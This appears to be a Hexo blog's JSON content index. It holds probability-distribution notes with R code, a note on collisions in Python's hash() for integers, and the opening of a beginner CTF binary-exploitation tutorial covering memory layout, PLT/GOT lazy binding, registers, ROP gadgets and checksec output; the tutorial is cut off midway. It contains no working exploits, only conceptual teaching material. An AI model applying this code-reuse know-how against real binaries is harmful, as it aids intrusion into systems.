{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io/en","root":"/en/"},"pages":[{"title":"友链","date":"2025-11-23T19:34:07.425Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/en/friends/index.html","excerpt":"","text":""},{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/en/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"","date":"2025-12-20T17:04:06.180Z","updated":"2025-12-20T17:04:06.180Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/en/about/index.html","excerpt":"","text":"TUM数学系研究生在读，CTF萌新。 CTF队伍h4tum成员，主要负责Crypto方向。 I’m a Master’s student in Mathematics at TUM and new to CTF. Member of the CTF team h4tum, mainly focusing on Crypto challenges. 联系/Contact Email: archer.ren@tum.de"},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/en/tags/index.html","excerpt":"","text":""},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/en/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Probability Distributions","slug":"TUM  数学 笔记/概率统计/Probability-Distributions","date":"2025-06-26T15:05:33.000Z","updated":"2026-02-25T05:39:52.580Z","comments":true,"path":"2025/06/26/TUM  数学 笔记/概率统计/Probability-Distributions/","permalink":"https://archer-baiyi.github.io/en/2025/06/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/Probability-Distributions/","excerpt":"Common Probability Distributions","text":"Normal DistributionArguments: $\\mu$ (mean), $\\sigma^2$ (variance) Probability density function (PDF): f(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}}, \\quad -\\infty < x < \\inftyCumulative Distribution Function (CDF): F(x) = \\Phi\\left(\\frac{x-\\mu}{\\sigma}\\right) = \\int_{-\\infty}^{x} \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(t-\\mu)^2}{2\\sigma^2}} dtExpectation: E[X] = \\muVariance: \\text{Var}(X) = \\sigma^2Moments: E[(X-\\mu)^n] = \\begin{cases} 0 & \\text{if } n \\text{ is odd} \\\\ \\sigma^n (n-1)!! & \\text{if } n \\text{ is even} \\end{cases}$(n-1)!! = (n-1)(n-3)\\cdots 3 \\cdot 1$ is the double factorial. Moment generating function: M_X(t) = e^{\\mu t + \\frac{1}{2}\\sigma^2 t^2}Definition:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, we call a distribution with the density functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},the normal distribution $N(\\mu, \\sigma^2)$.For $\\mu = 0$ and $\\sigma^2 = 1$, this reduces to the densityf(x) = \\frac{1}{\\sqrt{2\\pi}} e^{-\\frac{x^2}{2}}, \\quad x \\in \\mathbb{R},of the standard normal distribution $N(0, 1)$. Theorem:For $\\mu \\in \\mathbb{R}$ and $\\sigma &gt; 0$, the functionf(x) = \\frac{1}{\\sqrt{2\\pi}\\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}, \\quad x \\in \\mathbb{R},is indeed a density function. Proof: Using the substitution $y = \\frac{x - \\mu}{\\sigma}$, so that $dx = \\sigma \\, dy$, we have: \\int_{\\mathbb{R}} f(x) \\, dx = \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^\\infty e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}} \\, dx = \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy = \\frac{1}{\\sqrt{2\\pi}} \\cdot I,where I = \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy.Note that this integral exists. Consider: I^2 = \\left( \\int_{-\\infty}^\\infty e^{-\\frac{x^2}{2}} \\, dx \\right) \\left( \\int_{-\\infty}^\\infty e^{-\\frac{y^2}{2}} \\, dy \\right) = \\int_{-\\infty}^\\infty \\int_{-\\infty}^\\infty e^{-\\frac{x^2 + y^2}{2}} \\, dx \\, dy.We switch to polar coordinates, i.e., we substitute x = r \\cos \\theta, \\quad y = r \\sin \\theta, \\quad r > 0, \\; \\theta \\in [0, 2\\pi).We compute the Jacobian determinant: \\left| \\frac{\\partial(x, y)}{\\partial(r, \\theta)} \\right| = \\left| \\begin{matrix} \\cos\\theta & -r \\sin\\theta \\\\ \\sin\\theta & r \\cos\\theta \\end{matrix} \\right| = r.So we obtain: I^2 = \\int_0^\\infty \\int_0^{2\\pi} e^{-\\frac{r^2}{2}} r \\, d\\theta \\, dr = 2\\pi \\int_0^\\infty r e^{-\\frac{r^2}{2}} \\, dr.Substitute $u = \\frac{r^2}{2}$, so that $du = r \\, dr$: 2\\pi \\int_0^\\infty e^{-u} \\, du = 2\\pi [-e^{-u}]_0^\\infty = 2\\pi.Hence, we conclude: I = \\sqrt{2\\pi}, \\quad \\text{and therefore} \\quad \\int_{\\mathbb{R}} f(x) \\, dx = 1.$\\square$ Theorem: Let $X \\sim N(\\mu,\\sigma^2)$ be a random variable, then\\mathbb{E}[X] = \\mu, \\quad Var(X) = \\sigma^2. Proof: Expectation: Substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\mathbb{E}[X] &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma \\frac{1}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz +\\mu \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz \\\\ \\end{aligned}First notice that $z \\cdot e^{-z^2/2}$ is an odd function. Since \\int_{-\\infty}^{\\infty} |z e^{-z^2/2}| \\, dz = 2 \\int_0^{\\infty} z e^{-z^2/2} \\, dz = 2 \\cdot [-e^{-z^2/2}]_0^\\infty = 1,we have \\frac{\\sigma}{\\sqrt{2\\pi}}\\int_{-\\infty}^{\\infty} z \\cdot e^{-z^2/2} \\, dz = 0.(Do keep in mind: if $f$ is an odd function, then \\int_{-\\infty}^{\\infty}|f(x)|dx < \\inftyis a necessary condition of $\\int_{-\\infty}^{\\infty}f(x)dx = 0$. Because otherwise, $f(x)=x$ is a simple counterexample.) Moreover, we have seen in the last proof that \\frac{1}{\\sqrt{2\\pi}} \\int_{-\\infty}^{\\infty} e^{-z^2/2} \\, dz = 1.Therefore, \\mathbb{E}[X] = \\sigma \\cdot 0 + \\mu \\cdot 1 = \\mu.Variance: We compute: \\mathrm{Var}(X) = \\mathbb{E}[X^2] - (\\mathbb{E}[X])^2 = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2Again substitute $z = \\frac{x - \\mu}{\\sigma} \\Rightarrow x = \\sigma z + \\mu$, and $dx = \\sigma dz$: \\begin{aligned} \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx &= \\int_{-\\infty}^{\\infty} (\\sigma z + \\mu)^2 \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\int_{-\\infty}^{\\infty} (\\sigma^2 z^2 + 2\\sigma \\mu z + \\mu^2) \\cdot \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2} \\, dz \\\\ &= \\sigma^2 \\int z^2 \\phi(z) \\, dz + 2\\sigma\\mu \\int z \\phi(z) \\, dz + \\mu^2 \\int \\phi(z) \\, dz \\\\ &= \\sigma^2 \\cdot 1 + 2\\sigma\\mu \\cdot 0 + \\mu^2 \\cdot 1 \\\\ &= \\sigma^2 + \\mu^2 \\end{aligned}, where \\phi(z) = \\frac{1}{\\sqrt{2\\pi}} e^{-z^2/2}.In addition, since $\\phi’(z) = z\\phi(z)$, \\begin{aligned} \\int_{-\\infty}^{\\infty} z^2 \\phi(z) \\, dz &= \\int_{-\\infty}^{\\infty} z \\cdot (-\\phi'(z)) \\, dz \\\\ &\\overset{\\text{integration by parts}}{=} [-z\\phi(z)]_{-\\infty}^{\\infty} + \\int_{-\\infty}^{\\infty} \\phi(z) \\, dz \\\\ &= 0+1 = 1. \\end{aligned}Finally, we have \\mathrm{Var}(X) = \\int_{-\\infty}^{\\infty} x^2 f(x) \\, dx - \\mu^2 = \\sigma^2 + \\mu^2 - \\mu^2 = \\sigma^2.$\\square$ Bernoulli DistributionArguments: $p$ (probability of success, $0 \\le p \\le 1$) Probability mass function (PMF): P(X=k) = p^k (1-p)^{1-k}, \\quad k \\in \\{0, 1\\}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < 0 \\\\ 1-p & 0 \\le x < 1 \\\\ 1 & x \\ge 1 \\end{cases}Expectation: E[X] = pVariance: \\text{Var}(X) = p(1-p)Moments: E[X^n] = p \\quad (n \\ge 1)Moment generating function: M_X(t) = 1 - p + pe^tBinomial DistributionArguments: $n$ (number of trials), $p$ (probability of success) Probability mass function (PMF): P(X=k) = \\binom{n}{k} p^k (1-p)^{n-k}, \\quad k = 0, 1, \\dots, nCumulative Distribution Function (CDF): F(x) = \\sum_{i=0}^{\\lfloor x \\rfloor} \\binom{n}{i} p^i (1-p)^{n-i}Expectation: E[X] = npVariance: \\text{Var}(X) = np(1-p)Moments: E[X^2] = n(n-1)p^2 + npMoment generating function: M_X(t) = (1 - p + pe^t)^nPoisson DistributionArguments: $\\lambda$ (average rate per unit time/area, $\\lambda &gt; 0$) Probability mass function (PMF): P(X=k) = \\frac{\\lambda^k e^{-\\lambda}}{k!}, \\quad k = 0, 1, 2, \\dotsCumulative Distribution Function (CDF): F(x) = e^{-\\lambda} \\sum_{i=0}^{\\lfloor x \\rfloor} \\frac{\\lambda^i}{i!}Expectation: E[X] = \\lambdaVariance: \\text{Var}(X) = \\lambdaMoments: E[X^2] = \\lambda^2 + \\lambdaMoment generating function: M_X(t) = e^{\\lambda(e^t - 1)}Geometric DistributionArguments: $p$ (probability of success). Here it is defined as the first success on the $k$-th trial (Support: $1, 2, \\dots$) Probability mass function (PMF): P(X=k) = (1-p)^{k-1}p, \\quad k = 1, 2, \\dotsCumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < 1 \\\\ 1 - (1-p)^{\\lfloor x \\rfloor} & x \\ge 1 \\end{cases}Expectation: E[X] = \\frac{1}{p}Variance: \\text{Var}(X) = \\frac{1-p}{p^2}Moments: This involves polylogarithms and has no simple elementary closed form. A recursive formula is commonly used: E[X^n] = \\frac{1}{p} \\sum_{k=0}^{n-1} \\binom{n}{k} E[X^k] (1-p) E[X^2] = \\frac{2-p}{p^2}Moment generating function: M_X(t) = \\frac{pe^t}{1 - (1-p)e^t}, \\quad \\text{for } t < -\\ln(1-p)Uniform DistributionArguments: $a, b$ (interval endpoints, $a &lt; b$) Probability density function (PDF): f(x) = \\begin{cases} \\frac{1}{b-a} & a \\le x \\le b \\\\ 0 & \\text{otherwise} \\end{cases}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 0 & x < a \\\\ \\frac{x-a}{b-a} & a \\le x < b \\\\ 1 & x \\ge b \\end{cases}Expectation: E[X] = \\frac{a+b}{2}Variance: \\text{Var}(X) = \\frac{(b-a)^2}{12}Moments: E[X^n] = \\frac{b^{n+1} - a^{n+1}}{(n+1)(b-a)}Moment generating function: M_X(t) = \\frac{e^{tb} - e^{ta}}{t(b-a)}, \\quad t \\neq 0Exponential DistributionArguments: $\\lambda$ (rate parameter, $\\lambda &gt; 0$) Probability density function (PDF): f(x) = \\begin{cases} \\lambda e^{-\\lambda x} & x \\ge 0 \\\\ 0 & x < 0 \\end{cases}Cumulative Distribution Function (CDF): F(x) = \\begin{cases} 1 - e^{-\\lambda x} & x \\ge 0 \\\\ 0 & x < 0 \\end{cases}Expectation: E[X] = \\frac{1}{\\lambda}Variance: \\text{Var}(X) = \\frac{1}{\\lambda^2}Moments: E[X^n] = \\frac{n!}{\\lambda^n}Moment generating function: M_X(t) = \\frac{\\lambda}{\\lambda - t}, \\quad t < \\lambdaGamma DistributionArguments: $\\alpha$ (shape), $\\beta$ (rate; sometimes $\\theta = 1/\\beta$ is used as the scale) Probability density function (PDF): f(x) = \\frac{\\beta^\\alpha}{\\Gamma(\\alpha)} x^{\\alpha-1} e^{-\\beta x}, \\quad x > 0Cumulative Distribution Function (CDF): F(x) = \\frac{\\gamma(\\alpha, \\beta x)}{\\Gamma(\\alpha)}where $\\gamma(s, x) = \\int_0^x t^{s-1} e^{-t} dt$. Expectation: E[X] = \\frac{\\alpha}{\\beta}Variance: \\text{Var}(X) = \\frac{\\alpha}{\\beta^2}Moments: E[X^n] = \\frac{\\Gamma(\\alpha+n)}{\\beta^n \\Gamma(\\alpha)} = \\frac{\\alpha(\\alpha+1)\\cdots(\\alpha+n-1)}{\\beta^n}Moment generating function: M_X(t) = \\left( \\frac{\\beta}{\\beta - t} \\right)^\\alpha, \\quad t < \\betaChi-Squared DistributionArguments: $k$ (degrees of freedom, $k \\in \\mathbb{N}^*$) The chi-squared distribution is a special case of the gamma distribution, with $\\alpha = k/2$ and $\\beta = 1/2$. Probability density function (PDF): f(x) = \\frac{1}{2^{k/2}\\Gamma(k/2)} x^{k/2 - 1} e^{-x/2}, \\quad x > 0Cumulative Distribution Function (CDF): F(x) = \\frac{\\gamma(k/2, x/2)}{\\Gamma(k/2)} = P\\left(\\frac{k}{2}, \\frac{x}{2}\\right)where $\\gamma(s, x)$ is the lower incomplete gamma function and $P$ is the regularized gamma function. Expectation: E[X] = kVariance: \\text{Var}(X) = 2kMoments: E[X^n] = 2^n \\frac{\\Gamma(k/2 + n)}{\\Gamma(k/2)} = \\prod_{i=0}^{n-1} (k+2i) = k(k+2)(k+4)\\cdots(k+2n-2)Moment generating function: M_X(t) = (1 - 2t)^{-k/2}, \\quad t < \\frac{1}{2}Beta DistributionArguments: $\\alpha, \\beta$ (shape parameters, $\\alpha &gt; 0, \\beta &gt; 0$) Probability density function (PDF): f(x) = \\frac{1}{B(\\alpha, \\beta)} x^{\\alpha-1} (1-x)^{\\beta-1}, \\quad 0 < x < 1where $B(\\alpha, \\beta) = \\frac{\\Gamma(\\alpha)\\Gamma(\\beta)}{\\Gamma(\\alpha+\\beta)}$ is the beta function. Cumulative Distribution Function (CDF): F(x) = I_x(\\alpha, \\beta) = \\frac{B(x; \\alpha, \\beta)}{B(\\alpha, \\beta)}where $B(x; \\alpha, \\beta) = \\int_0^x t^{\\alpha-1}(1-t)^{\\beta-1} dt$ is the incomplete beta function, and $I_x$ is the regularized incomplete beta function. Expectation: E[X] = \\frac{\\alpha}{\\alpha + \\beta}Variance: \\text{Var}(X) = \\frac{\\alpha\\beta}{(\\alpha+\\beta)^2(\\alpha+\\beta+1)}Moments: E[X^n] = \\frac{B(\\alpha+n, \\beta)}{B(\\alpha, \\beta)} = \\prod_{i=0}^{n-1} \\frac{\\alpha+i}{\\alpha+\\beta+i}Moment generating function: There is no elementary closed form; it is commonly expressed via the confluent hypergeometric function: M_X(t) = 1 + \\sum_{k=1}^\\infty \\left( \\prod_{r=0}^{k-1} \\frac{\\alpha+r}{\\alpha+\\beta+r} \\right) \\frac{t^k}{k!}RIn R, there is a very standard prefix naming convention for working with probability distributions. For each distribution (e.g., norm), there are 4 core functions: d (Density): PDF/PMF, e.g., dnorm p (Probability): CDF, e.g., pnorm q (Quantile): quantile function (inverse CDF), e.g., qnorm r (Random): generate random numbers, e.g., rnorm 1. Discrete Distributions1. Bernoulli &amp; BinomialThere is no dedicated bernoulli function in R; the Bernoulli distribution is just a binomial distribution with size = 1. 123456789101112131415161718# Parameter setup: n=10 trials, p=0.5 success probabilityn &lt;- 10p &lt;- 0.5# 1. PMF (Density): probability of exactly 5 successes P(X=5)dbinom(x = 5, size = n, prob = p)# 2. CDF (Probability): probability of successes &lt;= 5, P(X&lt;=5)pbinom(q = 5, size = n, prob = p)# 3. Quantile: number of successes when cumulative probability reaches 0.95qbinom(p = 0.95, size = n, prob = p)# 4. Random: simulate 5 experiments, each with n trialsrbinom(n = 5, size = n, prob = p)# Special case: Bernoulli distribution (size = 1)rbinom(n = 10, size = 1, prob = 0.5) # generate 10 values of 0 or 1 2. Poisson Distribution1234567891011# Parameter setup: lambda = 4lam &lt;- 4# 1. PMF: probability of observing 3 events P(X=3)dpois(x = 3, lambda = lam)# 2. CDF: probability of observing &lt;= 3 events P(X&lt;=3)ppois(q = 3, lambda = lam)# 3. Random: generate 10 Poisson random variablesrpois(n = 10, lambda = lam) 3. Geometric DistributionIn R, the geometric distribution is defined as the number of failures ($X \\in \\{0, 1, \\dots\\}$) until the first success. If you use the definition $X \\in \\{1, 2, \\dots\\}$ (first success on the $k$-th trial), then x in R should be k-1. 123456789101112# Parameter: p = 0.2prob &lt;- 0.2# 1. PMF: first success on the 5th trial (meaning 4 failures first)# Mapping: P(X=5 in math definition) -&gt; dgeom(4, p)dgeom(x = 4, prob = prob) # 2. CDF: probability of succeeding on or before the 5th trialpgeom(q = 4, prob = prob)# 3. Random: generate 10 samples (returns number of failures)rgeom(n = 10, prob = prob) 2. Continuous Distributions4. Uniform Distribution123456789101112# Parameters: interval [a, b] -&gt; min=0, max=10a &lt;- 0b &lt;- 10# 1. PDF: density at x=5 (constant 1/(b-a) for uniform)dunif(x = 5, min = a, max = b)# 2. CDF: P(X &lt;= 5)punif(q = 5, min = a, max = b)# 3. Random: generate 5 random numbers between [0, 10]runif(n = 5, min = a, max = b) 5. Exponential Distribution1234567891011# Parameter: lambda (rate) = 0.5lam &lt;- 0.5# 1. PDF: f(x) at x=2dexp(x = 2, rate = lam)# 2. CDF: P(X &lt;= 2) = 1 - e^(-lambda * 2)pexp(q = 2, rate = lam)# 3. Random: generate exponential random variablesrexp(n = 5, rate = lam) 6. Normal DistributionNote: R uses the standard deviation sd ($\\sigma$) as the parameter, not the variance ($\\sigma^2$). 123456789101112131415# Parameters: mean=0, sd=1 (standard normal)mu &lt;- 0sigma &lt;- 1# 1. PDF: f(x)dnorm(x = 1.96, mean = mu, sd = sigma)# 2. CDF: P(X &lt;= 1.96) ≈ 0.975pnorm(q = 1.96, mean = mu, sd = sigma)# 3. Quantile: inverse lookup, find z such that P(X &lt;= z) = 0.975qnorm(p = 0.975, mean = mu, sd = sigma) # approximately 1.96# 4. Random: generate normal datarnorm(n = 10, mean = mu, sd = sigma) 7. Gamma DistributionR supports either the rate ($\\beta$) or scale ($1/\\beta$) parameter. 123456789101112# Parameters: alpha (shape) = 2, beta (rate) = 0.5alpha &lt;- 2beta &lt;- 0.5# 1. PDF: f(x)dgamma(x = 4, shape = alpha, rate = beta)# 2. CDF: F(x)pgamma(q = 4, shape = alpha, rate = beta)# 3. Randomrgamma(n = 10, shape = alpha, rate = beta)","categories":[{"name":"TUM Math note","slug":"TUM-Math-note","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/"},{"name":"Probability & Statistics","slug":"TUM-Math-note/Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-Math-note/Probability-Statistics/"}],"tags":[{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"},{"name":"distribution","slug":"distribution","permalink":"https://archer-baiyi.github.io/en/tags/distribution/"}]},{"title":"Collisions of Python’s Built-in hash() Function","slug":"CTF/Crypto/Python内置的哈希函数的漏洞","date":"2025-05-17T17:40:40.000Z","updated":"2026-02-25T05:44:36.782Z","comments":true,"path":"2025/05/17/CTF/Crypto/Python内置的哈希函数的漏洞/","permalink":"https://archer-baiyi.github.io/en/2025/05/17/CTF/Crypto/Python%E5%86%85%E7%BD%AE%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E/","excerpt":"Collisions Vuln of Python’s Built-in hash() Function","text":"hash()Python has a built-in hash function hash(). You can find the corresponding explanation in the Python Standard Library documentation: (Source: https://docs.python.org/3/library/stdtypes.html#hashing-of-numeric-types) That is, on 32-bit platforms the hash is computed as \\text{hash}(x) = x \\text{ mod } 2^{31}-1and on 64-bit platforms it is computed as \\text{hash}(x) = x \\text{ mod } 2^{61}-1CollisionThe construction of this hash function implies that we can very easily find a hash collision, because it satisfies neither of the two types of resistance (weak and strong collision resistance). Suppose we are given an integer $x$. On a 32-bit platform, we can compute a $y$ such that $\\text{hash}(x)=\\text{hash}(y)$ via y := x + 2^{31} - 1On a 64-bit platform, y := x + 2^{61} - 1.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/en/tags/Hash/"},{"name":"python","slug":"python","permalink":"https://archer-baiyi.github.io/en/tags/python/"}]},{"title":"Intro to Pwn (Binary Exploitation)","slug":"CTF/Pwn/Pwn入门","date":"2025-05-12T15:01:08.000Z","updated":"2026-02-25T05:57:18.917Z","comments":true,"path":"2025/05/12/CTF/Pwn/Pwn入门/","permalink":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/","excerpt":"Introduction to Pwn","text":"This article mainly introduces common pwn vulnerabilities and exploitation approaches for 64-bit programs on the x86-64 architecture. (Many parts about background knowledge, security checks, and tool introductions may be completely confusing at first. That’s totally fine—just know these things exist, and come back when you need a specific concept/command later.) Background KnowledgeAddress Space (Prozess Adressraum)An address space can be viewed as a huge one-dimensional byte array. While a program is running, only a small portion of it (compared to its potential size) actually contains data. Because the address space is very sparse, the OS divides it into equally sized pages, and only the pages that are mapped by the OS can be accessed. When a program is loaded from disk, it is placed into the lower address range (the corresponding pages are provided automatically by the OS or the program loader). Executable machine code is stored in the text segment (Text Segment). Statically initialized variables and string constants are stored in the data segment (Data Segment). Static variables that are not initialized at program start go into the BSS segment, and are filled with zero bytes by the OS. Dynamic libraries needed by the program also consist of these segments, and are loaded by the program loader into higher memory addresses. Since these libraries typically request memory through the mmap system call, they are often referred to as belonging to the MMap segment. During program initialization, two additional regions are reserved: Stack: for automatically managed variables. Heap: for dynamically allocated variables. Each function call expands the stack by creating a stack frame. A stack frame stores the current function’s local variables and some management data, such as the return address. The return address records where the current function was called from. As call depth increases, the stack grows from high addresses down to low addresses. When you need data to remain valid after a function returns, you must allocate it on the heap (because stack variables are automatically freed when the function returns). In this situation, the program uses the allocator provided by libc, typically via malloc, to request memory. If possible, the allocator returns a pointer into the pre-reserved heap region. If the heap space is insufficient, the allocator requests a new mapped region via mmap and returns a pointer into that region. Besides the allocator, the C standard library (libc) also provides many commonly used functions to simplify interaction with the operating system. Code (the text segment) is fixed, but the address of dynamic libraries (such as libc) can change each run due to ASLR, or may not even be known at compile time. So how does the program find the real address of printf or system? That’s where PLT and GOT come in: PLT (Procedure Linkage Table): Stored in the .plt section (similar to the text segment: read-only, executable code). Jumps via the GOT (by using the GOT entry address for the function). GOT (Global Offset Table): Stored in the .got.plt section (part of the data segment: readable, writable data). Initially points back into the PLT; after resolution it points to libc. For startup performance, Linux typically does not resolve all function addresses immediately. Instead, it resolves them only when they are first used. This is called lazy binding. Lazy binding can be described in two stages: Stage 1: First call (symbol resolution phase) When the program calls a shared-library function (e.g., printf) for the first time, the address is not resolved yet, so execution proceeds like this: Call PLT stub: Code in the program’s .text executes call printf@plt, transferring control to the corresponding printf stub in .plt. Indirect jump: The PLT stub executes jmp *printf@GOT, an indirect jump whose target is read from the corresponding entry in .got.plt. Fallthrough inside the PLT: Initially, the .got.plt entry does not contain the real function address. Instead, it contains the address of the next instruction inside the PLT stub (right after the jmp). Therefore control does not jump out yet; it continues executing the rest of the PLT stub. Prepare relocation parameters: The PLT stub pushes the relocation index for this symbol onto the stack, then jumps to the common PLT entry (PLT[0]). Invoke the dynamic linker: PLT[0] pushes the link_map structure pointer and calls the dynamic linker resolver (typically _dl_runtime_resolve). Resolve &amp; patch: _dl_runtime_resolve looks up printf in the exported symbol tables of loaded libraries, finds its actual virtual address (e.g., 0x7ffff7a0d123), then: Calls the function, and Updates the GOT entry by writing the real address into .got.plt, replacing the original “fallthrough” address. Stage 2: Subsequent calls (direct execution phase) When the program later executes call printf@plt again, the corresponding GOT entry has already been patched, so it becomes much simpler: Call PLT stub: call printf@plt jumps into .plt. Direct redirection: The PLT stub executes jmp *printf@GOT, but now the .got.plt entry already contains the real address (e.g., 0x7ffff7a0d123). Control transfer: The CPU jumps straight into printf inside libc, without invoking the dynamic linker again. A more detailed address space layout illustration: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071High Address (usually around 0x7fffffffffff) |+---------------------------+| Kernel Space | (Kernel space - not directly accessible in user mode)+---------------------------+| Command Line Args | (argv pointers)| Environment Vars | (envp pointers)+---------------------------+ &lt;--- [Stack Base]| || Stack | (Stack)| (Grows Down) | Local vars, args, return addresses| | || v |+---------------------------+ &lt;--- [RSP]| || (Random Gap) | (Random offset for ASLR)| |+---------------------------+| || Memory Mapping Segment | &lt;--- [MMap Segment]| (Shared Libraries) | Shared libs (libc.so, ld-linux.so)| | | +-------------------+ || | libc.so .text | || | (real printf addr) | || +-------------------+ || |+---------------------------+| || (Random Gap) || |+---------------------------+| ^ || | || Heap | (Heap)| (Grows Up) | malloc/new allocations| |+---------------------------+ &lt;--- [Heap Base]| || .bss Segment | (Uninitialized data)| (Block Started by Symbol)| global_var defaults to 0| |+---------------------------+| || .data Segment | (Initialized data)| | e.g., int flag = 1;| |+---------------------------+| || .got.plt Section | &lt;--- [GOT] (part of Data Segment)| (Global Offset Table) || |+---------------------------+| || .plt Section | &lt;--- [PLT] (part of Text Segment)| (Procedure Linkage Table)|| |+---------------------------+| || .text Segment | &lt;--- [Code segment]| (Binary Code) || | main is here| |+---------------------------+| || Read-Only Data | (.rodata) string literals like &quot;Hello World&quot;+---------------------------+ | | (~0x00400000 if non-PIE; randomized if PIE) |Low Address (0x000000000000) If ASLR is enabled (discussed below), then the Stack Base, MMap Base, and Heap Base are randomized each run. During execution, if the program accesses an invalid address (an unmapped page), the OS sends a Segmentation Fault signal to the program. If the program does not handle it, it terminates. x86 AssemblyAssembly is a large topic, so it’s not possible to cover everything here. You can find additional resources and learn along the way. But you don’t need to fully master assembly before doing pwn. You can learn assembly while solving pwn challenges—having real examples often makes it easier and more efficient. Here are a few important points: Linux x64 (System V AMD64 ABI) argument passing order: RDI (1st argument) RSI (2nd argument) RDX (3rd argument) RCX (4th argument) R8 (5th argument) R9 (6th argument) Further arguments are passed on the stack Other commonly used registers: RIP (Instruction Pointer) Meaning: points to the address of the next instruction to execute. Pwn relevance: when a function executes ret, the CPU pops an address into RIP. RSP (Stack Pointer) Meaning: always points to the top of the stack. Pwn relevance: push/pop automatically change it. RBP (Base Pointer) Meaning: the base (bottom) of a stack frame. Pwn relevance: used to locate locals; leave; ret can be used for stack pivoting. RAX (Accumulator) Normal usage: arithmetic results, function return values. Pwn core usage (Syscall): for ret2syscall/SROP, RAX decides which syscall to invoke. RAX = 59 (0x3b) -&gt; execve RAX = 0 -&gt; read RAX = 1 -&gt; write RAX = 15 -&gt; rt_sigreturn Special segment register: FS Pwn relevance: on 64-bit Linux, the stack canary value is stored at fs:[0x28]. GadgetA gadget is a short sequence of machine instructions extracted from existing executable memory regions (such as .text or shared libraries) for code-reuse attacks, and it ends with a control-flow transfer instruction. The most common form is a ROP gadget (Return-Oriented Programming gadget), which ends strictly with ret. A standard gadget consists of: Operational instructions: perform actual computation/data movement/logic (e.g., pop, mov, add, xor). Terminator: returns control back to the attacker-controlled flow. In ROP, this is ret. Execution primitive: gadgets are not called via call like normal functions. Instead, the attacker drives execution using the stack pointer (RSP/ESP) as a pseudo instruction pointer. What ret really does: pop rip. It pops a value from the stack into RIP. The attacker pre-arranges a sequence of addresses on the stack (a ROP chain). Each gadget ends with ret, causing the CPU to fetch the next gadget address from the stack and jump to it. So in ROP, RSP effectively replaces the role of RIP, and stack data becomes an instruction stream. Common gadgets: pop rdi ; ret, pop rsi ; ret, pop rdx ; ret: set up function arguments pop rbp: pops 8 bytes into rbp and increments rsp by 8 Security ChecksWe can use checksec to check the security properties of a binary. Install: 1sudo apt install checksec Examples: 123456789└─$ checksec ./vuln Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Debuginfo: Yes 12345678└─$ checksec ./racecar Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Stripped: No 1234567891011└─$ checksec vuln Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX unknown - GNU_STACK missing PIE: No PIE (0x400000) Stack: Executable RWX: Has RWX segments Stripped: No Debuginfo: Yes 12345678└─$ checksec vuln Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Explanation: Arch: architecture of the binary 